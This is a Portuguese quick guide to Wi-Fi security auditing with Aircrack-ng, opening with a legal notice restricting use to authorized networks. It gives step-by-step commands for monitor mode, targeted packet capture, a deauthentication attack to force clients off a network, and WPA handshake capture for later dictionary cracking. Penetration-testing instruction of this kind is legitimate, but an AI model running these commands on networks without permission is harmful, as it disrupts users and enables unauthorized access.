# Guia Rápido: Auditoria de Redes Wireless com Aircrack-ng

**Aviso Legal:** O uso dessas ferramentas para monitorar ou atacar redes sem fio das quais você **não possui autorização explícita** é ilegal e antiético. Use-as apenas em seus próprios equipamentos (ambiente de teste) ou redes com permissão documentada para fins de aprendizado ou auditoria de segurança.

-----

## 1\. Mapeamento de Rede com `airodump-ng` (Modo Monitor)

O **`airodump-ng`** é usado para capturar pacotes, visualizar redes Wi-Fi disponíveis e capturar o *handshake* WPA/WPA2.

### Passos

1.  **Verificar e Ativar o Modo Monitor:**

      * Verifique o nome da sua interface wireless:
        ```bash
        sudo airmon-ng
        ```
        
      * Ative o modo monitor (substitua `wlan0` pela sua interface):
        ```bash
        sudo airmon-ng start wlan0
        ```
        ou caso a interface suporte 5GHz e 2,4GHz:
        ```bash
        sudo airmon-ng start wlan0 --band abg
        ```

      * A nova interface de monitoramento será criada (ex: **`wlan0mon`** ou **`mon0`** ou pode continuar como **`wlan0`**). Verifique a lista de interfaces sem fio usando o comando **`iwconfig`**:
      ```
      ┌──(root㉿kali)-[/home/kali]
      └─# iwconfig
            lo        no wireless extensions.

            eth0      no wireless extensions.

            wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
                      Retry short limit:7   RTS thr:off   Fragment thr:off
                      Power Management:on
      ```
      ou
      ```
      ┌──(kali㉿kali)-[~]
      └─$ sudo airmon-ng start wlan0

      Found 2 processes that could cause trouble.
      Kill them using 'airmon-ng check kill' before putting
      the card in monitor mode, they will interfere by changing channels
      and sometimes putting the interface back in managed mode

      PID Name
      514 NetworkManager
      6171 wpa_supplicant

      PHY     Interface       Driver          Chipset

      phy1    wlan0           mt76x2u         MediaTek Inc. MT7612U 802.11a/b/g/n/ac
                  (mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
                  (mac80211 station mode vif disabled for [phy1]wlan0)
      ```
      iwconfig:
      ```
      ┌──(kali㉿kali)-[~]
      └─$ iwconfig
      lo        no wireless extensions.

      eth0      no wireless extensions.

      wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
            Retry short limit:7   RTS thr:off   Fragment thr:off
            Power Management:on
      ```
          




2.  **Mapear Redes (APs):**

      * Execute o `airodump-ng` na nova interface:
        ```bash
        sudo airodump-ng wlan0mon
        ```
      * Aguarde. Ele listará todas as redes (**BSSID**, canais, criptografia, ESSID) e os clientes conectados.

3.  **Focar em uma Rede e Preparar a Captura do Handshake (Importante!):**

      * Quando encontrar a rede alvo, interrompa o processo (`Ctrl+C`).
      * Execute novamente, focando no **BSSID** e **Canal** da rede alvo. Isso melhora a captura de pacotes, inclusive do *handshake*:
        ```bash
        sudo airodump-ng --bssid <BSSID do AP> -c <Canal do AP> -w <Nome do Arquivo> wlan0mon
        ```
      * **Exemplo:** `sudo airodump-ng --bssid 1A:2B:3C:4D:5E:6F -c 6 -w capture_target wlan0mon`
          * `-w`: Salva os pacotes capturados em um arquivo.
      * Mantenha este terminal **aberto e executando**.

-----

## 2\. Desconexão de Dispositivo com `aireplay-ng` (Desautenticação) para Capturar o Handshake

O **`aireplay-ng`** é usado para injetar pacotes. O ataque de desautenticação (*Deauth*) envia pacotes falsificados para o Access Point (AP) e/ou para o dispositivo alvo, fazendo com que o dispositivo se desconecte.

### Passos

1.  **Manter o `airodump-ng` em execução:**

      * Mantenha o `airodump-ng` rodando na rede alvo (como no passo 3 da seção anterior) para garantir que você tenha o **BSSID** e o **canal** corretos.

2. **Identificar Alvo:**
      * No terminal do `airodump-ng`, observe a seção **STATION** para encontrar um dispositivo cliente conectado à rede alvo (seu **BSSID do Cliente**). Se não houver clientes, o ataque será ineficaz.

3.  **Executar o Ataque de Desautenticação:**
      * Abra uma **nova janela do terminal** (mantendo o `airodump-ng` rodando na primeira).
      * Execute o `aireplay-ng` na interface monitora.
      * Use o `aireplay-ng` para enviar um pequeno número de pacotes de desautenticação para o cliente alvo:

    ```bash
    sudo aireplay-ng -0 <Contagem> -a <BSSID do AP> -c <BSSID do Cliente> wlan0mon
    ```
      * `-0`: Indica um ataque de desautenticação.
      * `<Contagem>`: Número de pacotes de desautenticação a serem enviados (use `0` para enviar continuamente), algo em torno de 10 pacotes.
      * `-a <BSSID do AP>`: O endereço MAC do Access Point alvo.
      * `-c <BSSID do Cliente>`: O endereço MAC do dispositivo cliente que você quer desconectar.


-----

## 3\. Confirmação da Captura

1.  **Verificar o Handshake:**

      * Após o ataque de desautenticação, observe o terminal do **`airodump-ng`**.
      * Se a captura for bem-sucedida, a mensagem **`WPA Handshake: <BSSID do AP>`** aparecerá no canto superior direito da tela.

2.  **Finalizar:**

      * Se o *handshake* foi capturado, você pode interromper o `airodump-ng` (`Ctrl+C`). O *handshake* foi salvo no arquivo (`<Nome do Arquivo>.cap`).
      * Desligue o modo monitor:
        ```bash
        sudo airmon-ng stop wlan0mon
        ```
-----

**Próxima Etapa:** O arquivo `.cap` (ex: `capture_target-01.cap`) agora contém o *handshake* e pode ser usado com ferramentas como **`aircrack-ng`** ou **`hashcat`** para tentar quebrar a senha usando um ataque de dicionário.

